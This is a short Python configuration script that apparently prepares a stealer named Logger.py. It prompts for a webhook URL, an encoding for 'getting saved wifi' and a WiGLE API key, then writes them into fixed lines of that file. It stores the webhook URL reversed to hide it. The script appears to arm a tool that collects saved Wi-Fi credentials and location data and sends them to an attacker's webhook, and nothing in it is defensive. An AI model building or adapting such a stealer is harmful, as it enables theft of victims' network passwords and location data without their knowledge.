file_path = 'Logger.py'
url = input('Your webhook URL here: ')
encoding = input('Input preferred encoding for getting saved wifi. Leave empty for utf-8 (the standard): ')
wigleapi = input('Enter you WiGLE api key (encoded for use) here (leave empty for no WiGLE api):')
if encoding == '':
    encoding = 'utf-8'

# Read the content of the file
with open(file_path, 'r') as file:
    lines = file.readlines()

# Check if there are at least 36 lines in the file
if len(lines) >= 36:
    # Modify line 35 with the new content
    lines[34] = f'webhookurl="{url[::-1]}"\n'  # line 35

    # Modify line 36 with the encoding information
    lines[35] = f'wifiencoding="{encoding}"\n'  # line 36
    if wigleapi != '':
     lines[36]=f'api_key = "{wigleapi}"'


    # Write the updated content back to the file
    with open(file_path, 'w') as file:
        file.writelines(lines)
    print("Lines are updated")
else:
    print("The file does not have at least 36 lines.")
